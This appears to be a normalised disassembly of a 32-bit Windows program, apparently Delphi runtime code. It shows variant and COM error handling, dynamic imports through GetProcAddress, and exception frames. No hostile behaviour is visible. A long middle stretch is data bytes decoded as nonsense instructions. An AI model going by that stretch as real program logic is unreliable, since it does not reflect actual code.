call sub_4040dc
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_407f08
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d76d
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40d778
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d7d2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4040dc
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4093b4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7d9
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40d7e4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d83e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4040dc
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409388
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d845
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40d850
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d8aa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4040dc
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40ac8c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8b1
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40d8bc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d916
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4040dc
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4093e0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d91d
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40d928
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d995
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4040dc
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_407ff4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d99c
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
sub_40d9a8
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40da08
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40933c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404680
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da0f
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40da18
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40da78
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a44c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404680
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da7f
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40da88
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40daec
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408090
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404680
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40daf3
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40db1c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40db48
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d6b8
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6e8
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6e8
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6f4
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6f4
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6f4
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6f4
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6f4
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6f4
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6f4
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6f4
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6f4
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d700
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d70c
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d778
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7e4
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d850
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8bc
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d928
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9a8
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da18
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da88
mov eax r-xdata
call sub_40db1c
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40de54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40de79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de80
retn
sub_40dfb4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
fild [ eax ]
or al 0x0
add [ eax ] al
jl r-xdata
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
push ss
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
loope r-xdata
inc ebp
jb r-xdata
jo r-xdata
popad
outsb
je r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub cl ah
inc eax
outsd
jb r-xdata
insb
outsd
ja r-xdata
popad
jae r-xdata
inc ebx
outsb
jbe r-xdata
dec edi
jbe r-xdata
loope r-xdata
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
rol ah 0xe0
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
pop ss
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
jb r-xdata
xor [ eax ] al
pop ss
inc ebp
push esi
popad
jb r-xdata
add [ eax - 0xbffbfd0 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0xc0040 ] cl
dec ecx
popad
outsb
je r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
shr [ eax ] 0xe1
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx fs
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub cl ah
inc ebx
popad
jb r-xdata
pushad
loopne r-xdata
inc ecx
jb r-xdata
outsb
js r-xdata
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
jb r-xdata
xor [ eax ] al
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
popad
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
outsb
jbe r-xdata
add [ ebx + esi + 0x40 ] dl
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
popad
outsb
je r-xdata
jb r-xdata
popad
outsb
je r-xdata
xor [ eax ] al
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x70795474
add [ eax - 0xbffbfd0 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x20 ] ah
inc eax
outsd
jb r-xdata
inc ebp
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc0040e2
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] bh
add [ ebx + esi + 0x40 ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
inc eax
add ah dh
xor [ eax ] al
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x65764f74
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
loopne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
loopne r-xdata
add [ eax ] al
lea eax [ eax ]
cld
fild [ eax ]
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
inc edx
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
jb r-xdata
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
jb r-xdata
outsb
je r-xdata
popad
rcl [ edx + 0x40 ] 0x0
add [ eax ] al
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
loop r-xdata
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
add [ eax - 0xbffbfd0 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
loope r-xdata
je r-xdata
popad
inc eax
add [ eax + 0x40e3 ] cl
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
xor [ eax ] al
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
pushfd
xor [ eax ] al
mov eax 0xf4004030
outsd
inc eax
add [ edx + 0x40 ] bh
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
pushfd
xor [ eax ] al
mov eax 0xf4004030
dec bp
insd
outsd
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
adc al 0x45
push esi
popad
jb r-xdata
inc eax
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
inc eax
insd
add [ ebx + esi + 0x40 ] dl
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x40 ] dl
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
inc ebp
jb r-xdata
add ah dh
xor [ eax ] al
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor eax [ eax ]
jne r-xdata
jo r-xdata
popad
je r-xdata
inc eax
add [ ebx ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
jb r-xdata
inc ebp
dec ebp
in al 0x8b
mov ebx eax
popad
adc [ eax - 0x43 ] ch
in al 0x40
add [ ebp - 0x601703bb ] cl
pop ecx
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ eax ] al
add [ eax ] al
outsd
xor eax eax
push ebp
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
push esp
dec edi
jb r-xdata
inc ebp
jb r-xdata
add [ ebx + esi + 0x40 ] dl
inc eax
add [ ebx + esi + 0x40 ] cl
je r-xdata
inc eax
add al dh
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
jecxz r-xdata
outsd
jb r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e4bd
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e3 ] cl
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] bh
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
outsd
xor [ eax ] al
pop ss
inc ebp
push esi
popad
jb r-xdata
add [ eax - 0xbffbfd0 ] bh
add [ eax ] al
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
jb r-xdata
push 0x0
xor eax eax
push ebp
push sub_40e4b6
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
in al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
jns r-xdata
push sub_40e54f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4101b0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4101b0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e556
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403e78
retn
jb r-xdata
outsd
sub_40e46c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e4b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e4bd
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40e4c0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e54f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4101b0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4101b0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e556
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403e78
retn
sub_40e55c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e5a6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5ad
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40e5b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e63f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4101b0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4101b0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e646
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403e78
retn
sub_40e64c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e696
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e69d
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40e6a0
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e8e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e8ec
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403e78
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403e78
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
jmp r-xdata
dec eax
je r-xdata
call sub_40e46c
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
jmp r-xdata
jmp r-xdata
call sub_40e55c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ad18
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
jmp r-xdata
jmp r-xdata
sub_40e900
